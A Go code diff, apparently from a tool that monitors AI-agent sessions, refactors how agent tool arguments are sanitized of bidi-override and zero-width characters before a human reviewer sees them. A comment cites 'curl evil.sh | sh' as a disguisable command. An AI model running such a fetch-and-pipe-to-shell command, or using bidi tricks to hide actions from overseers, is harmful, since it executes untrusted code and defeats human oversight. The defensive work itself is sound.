@@ -315,27 +315,35 @@ func toolArgument(raw json.RawMessage) string {
 	return inp.FilePath
 }
 
-// stripDeceptiveRunes removes control, bidi-override and other format runes.
+// sanitizeForDisplay returns s as a single render-safe line: control,
+// bidi-override and other format runes removed, remaining whitespace collapsed.
 // This text is agent-authored and is read by a human deciding what the agent
 // did: U+202E renders "curl evil.sh | sh" as innocuous reversed text, and a
 // zero-width space hides a word boundary (Trojan Source, CVE-2021-42574).
-func stripDeceptiveRunes(s string) string {
-	return strings.Map(func(r rune) rune {
+// Stripping and collapsing are one step so a caller cannot take the first
+// without the second and put raw newlines in a single-line field.
+func sanitizeForDisplay(s string) string {
+	stripped := strings.Map(func(r rune) rune {
 		if r == '\t' || r == '\n' || r == '\r' {
-			return r // real whitespace; strings.Fields collapses it next
+			return r // real whitespace; collapsed below
 		}
-		if unicode.IsControl(r) || unicode.Is(unicode.Cf, r) || unicode.Is(unicode.Bidi_Control, r) {
+		// Bidi controls are all category Cf, so the Cf test alone covers them.
+		if unicode.IsControl(r) || unicode.Is(unicode.Cf, r) {
 			return -1
 		}
 		return r
 	}, s)
+	return strings.Join(strings.Fields(stripped), " ")
 }
 
 // toolDetail is the display form of toolArgument: stripped of characters that
 // can make a command render as a different one, collapsed to one line, and cut
 // so a single entry cannot dominate the list.
 func toolDetail(raw json.RawMessage) string {
-	d := strings.Join(strings.Fields(stripDeceptiveRunes(toolArgument(raw))), " ")
+	d := sanitizeForDisplay(toolArgument(raw))
+	if len(d) <= toolDetailMaxLen {
+		return d // byte length >= rune count, so the cap cannot be exceeded
+	}
 	r := []rune(d)
 	if len(r) > toolDetailMaxLen {
 		// Name the size of the cut: the client clips visually too, so a bare
@@ -771,7 +779,14 @@ func ParseSessionFile(path string) (*SessionData, error) {
 		LastActivity: time.Now().Add(-24 * time.Hour), // default: old
 	}
 
-	var recentTools []sdk.RecentTool
+	// Name and raw input only: the display form costs a JSON unmarshal, a rune
+	// scan and two string copies, and all but the last five entries are dropped
+	// below. Deriving it here would compute it for every tool_use in the tail.
+	type trackedRecentTool struct {
+		name  string
+		input json.RawMessage
+	}
+	var recentTools []trackedRecentTool
 
 	// pendingToolUses tracks assistant tool_use blocks (id → block) in order; the
 	// last one with no matching tool_result is the pending tool. Ordered slice
@@ -854,7 +869,7 @@ func ParseSessionFile(path string) (*SessionData, error) {
 					case "tool_use":
 						hasToolUse = true
 						data.ToolCounts[b.Name]++
-						recentTools = append(recentTools, sdk.RecentTool{Name: b.Name, Detail: toolDetail(b.Input)})
+						recentTools = append(recentTools, trackedRecentTool{name: b.Name, input: b.Input})
 						data.CurrentAction = b.Name
 						if b.ID != "" {
 							toolUseOrder = append(toolUseOrder, trackedToolUse{id: b.ID, name: b.Name, input: b.Input})
@@ -937,10 +952,13 @@ func ParseSessionFile(path string) (*SessionData, error) {
 		data.TokenUsage = full.TokenUsage
 	}
 
-	if len(recentTools) > 5 {
-		data.LastTools = recentTools[len(recentTools)-5:]
-	} else {
-		data.LastTools = recentTools
+	kept := recentTools
+	if len(kept) > 5 {
+		kept = kept[len(kept)-5:]
+	}
+	data.LastTools = make([]sdk.RecentTool, len(kept))
+	for i, t := range kept {
+		data.LastTools[i] = sdk.RecentTool{Name: t.name, Detail: toolDetail(t.input)}
 	}
 
 	// Convergence detection: last 5 tools identical. Compares names only -- the
@@ -949,14 +967,14 @@ func ParseSessionFile(path string) (*SessionData, error) {
 		last5 := recentTools[len(recentTools)-5:]
 		allSame := true
 		for _, t := range last5[1:] {
-			if t.Name != last5[0].Name {
+			if t.name != last5[0].name {
 				allSame = false
 				break
 			}
 		}
 		if allSame {
 			data.ConvergenceAlert = true
-			data.ConvergenceToolName = last5[0].Name
+			data.ConvergenceToolName = last5[0].name
 		}
 	}
 
